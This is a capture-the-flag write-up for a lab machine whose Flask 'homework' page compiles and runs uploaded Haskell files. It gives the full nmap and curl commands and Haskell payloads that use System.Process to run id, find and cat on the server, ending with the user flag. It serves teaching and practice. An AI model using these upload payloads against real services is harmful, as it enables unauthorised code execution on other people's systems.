# Write-up : "Fun With Functional"

**Target:** 10.10.0.10

**Difficulty:** Easy

**Date:** 15/09/2026

**Techniques used:** Network reconnaissance, web enumeration, malicious file upload, arbitrary code execution (RCE), post-exploitation enumeration, privilege escalation

**Tools used:** nmap, curl

---

## 1. Network reconnaissance (Nmap)

**Command:**

```bash
nmap -sC -sV -p- -T4 10.10.0.10
```

**What this command does:** `nmap` is a port scanner. It sends network packets to the target machine to discover which services (ports) are open and accessible.

- `-sC`: runs automatic detection scripts (banners, known vulnerabilities, service versions).
- `-sV`: tries to precisely determine the version of each detected service.
- `-p-`: scans all 65535 possible ports (not just the most common ones).
- `-T4`: sets the scan speed to "aggressive" to go faster.

**Result:**

- `22/tcp`: SSH (OpenSSH 10.0p2), secure remote access service, here just identified, not directly exploited at first.
- `5001/tcp`: A web server running Flask (Python framework) via Werkzeug. The home page, titled "FUN with functionnal!", mocks security and extols the merits of the Haskell language, with a link to a `/homework` page.

---

## 2. Discovering the upload form

**Command:**

```bash
curl -s http://10.10.0.10:5001/homework
```

**What this command does:** `curl` sends an HTTP GET request to this URL and displays the server's response (the page's HTML code), exactly as a browser would, but from the command line.

**Result:** The page displays a file upload form. The text explains that a Haskell program (`.hs` extension) must be sent that prints the message "I love Haskell", and that this file will be automatically compiled and graded by a server-side "auto-grading tool".

**Why it's interesting:** as soon as a web server agrees to compile and execute a file sent by an external user, this opens the door to arbitrary code execution -> the program's content is never checked or restricted by the server.

---

## 3. Exploitation: Arbitrary code execution (RCE) via Haskell upload

**Vulnerability exploited:** Upload and execution of non-sandboxed code (CWE-434: Unrestricted Upload of File with Dangerous Type).

**Explanation of the vulnerability:** The server retrieves the uploaded `.hs` file, compiles it with GHC (the Haskell compiler) then executes the resulting binary, without ever checking what this program actually does. The Haskell language has a module called `System.Process` that allows executing any operating system command (just as a bash script would). By writing the Haskell program ourselves, we can therefore make it execute the commands of our choice on the server, in place of the server itself.

### Creating the payload (trapped Haskell file)

```bash
cat > exploit.hs << 'EOF'
import System.Process
main :: IO ()
main = do
    putStrLn "I love Haskell"
    output <- readProcess "id" [] ""
    putStrLn output
EOF
```

**What this command does:** `cat > exploit.hs << 'EOF' ... EOF` is a way of writing several lines of text directly into a new file named `exploit.hs`, without needing to open a text editor. Everything between the two `EOF` markers becomes the file's content.

**Explanation of the Haskell code contained in the file:**

- `import System.Process`: loads the Haskell module that allows launching system commands.
- `putStrLn "I love Haskell"`: prints the text required by the challenge (to comply with the instructions shown on the site).
- `output <- readProcess "id" [] ""`: executes the system command `id` (which displays the current user's identity: uid, gid, groups) and captures its output in the `output` variable.
- `putStrLn output`: prints this captured output.

### Uploading the file to the server

```bash
curl -s -X POST http://10.10.0.10:5001/homework -F "file=@exploit.hs"
```

**What this command does:** sends an HTTP POST request (method used to submit forms) containing the `exploit.hs` file as an attachment, exactly as if clicking "Browse" then "Upload" in a real web form.

- `-X POST`: specifies the HTTP method to use.
- `-F "file=@exploit.hs"`: tells curl to send the local file `exploit.hs` as form data, under the field name `file` (the one expected by the site's HTML form).

The server responds with a redirect to `/uploads/exploit.hs`, a sign that the upload was accepted.

### Retrieving the compilation/execution result

```bash
curl -s http://10.10.0.10:5001/uploads/exploit.hs
```

**What this command does:** retrieves the page where the server displays the result of compiling and executing the file we just sent.

**Result obtained:**

```
[1 of 2] Compiling Main ...
[2 of 2] Linking ...
I love Haskell
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

The server did compile our program, executed it, and we retrieve the output of the `id` command: the server runs as the system user `www-data` (the usual user for Apache/Nginx web servers). **Arbitrary command execution is confirmed.**

---

## 4. Locating the user.txt flag

Now that we can execute any command, we look for the location of the `user.txt` file on the filesystem.

```bash
cat > exploit.hs << 'EOF'
import System.Process
main :: IO ()
main = do
    putStrLn "I love Haskell"
    out <- readProcess "bash" ["-c", "find / -name user.txt | head"] ""
    putStrLn out
EOF

curl -s -X POST http://10.10.0.10:5001/homework -F "file=@exploit.hs"
curl -s http://10.10.0.10:5001/uploads/exploit.hs
```

**Explanation of the code change:** instead of directly executing the `id` command, which launches sh, which itself launches bash, which itself launches find, we now ask to execute `bash -c "..."`, which allows launching any complete shell command, with its own options.

- `find / -name user.txt`: searches, starting from the system root (`/`), for any file named exactly `user.txt`.

**Result:** among a long list of "Permission denied" messages (normal, `www-data` doesn't have access to all the system's folders), we find the line we're looking for:

```
/home/prof/user.txt
```

The file therefore belongs to a user named `prof`.

---

## 5. Reading the user flag

```bash
cat > exploit.hs << 'EOF'
import System.Process
main :: IO ()
main = do
    putStrLn "I love Haskell"
    output <- readProcess "cat" ["/home/prof/user.txt"] ""
    putStrLn output
EOF

curl -s -X POST http://10.10.0.10:5001/homework -F "file=@exploit.hs"
curl -s http://10.10.0.10:5001/uploads/exploit.hs
```

**Explanation:** here, we directly execute the `cat` command (displaying a file's content) with the exact path found in the previous step as an argument.

**Result obtained:**

```
EPI{h4sK377_C4n_83_r3vsh3ll_4s_W3lL}
```

---

## Summary of exploited vulnerability

| #   | Vulnerability                                                     | Type / Category                     | Short explanation                                                                                                                                              |
| --- | ----------------------------------------------------------------- | ----------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| 1   | Upload and execution of arbitrary Haskell code without sandboxing | Unrestricted Upload / RCE (CWE-434) | The server blindly compiles and executes any uploaded `.hs` file, allowing execution of any system command via the Haskell language's `System.Process` module. |

---

## Conclusion

- **Initial access:** RCE via upload of a non-sandboxed Haskell file → shell as `www-data`.
- **User flag:** obtained in `/home/prof/user.txt`.

---

## Evidences

### Flag user.txt

![Flag user.txt](Evidences/Flag%20user.png)

### Flag

![Flag](Evidences/Flag%20Fun%20with%20fonctional.png)
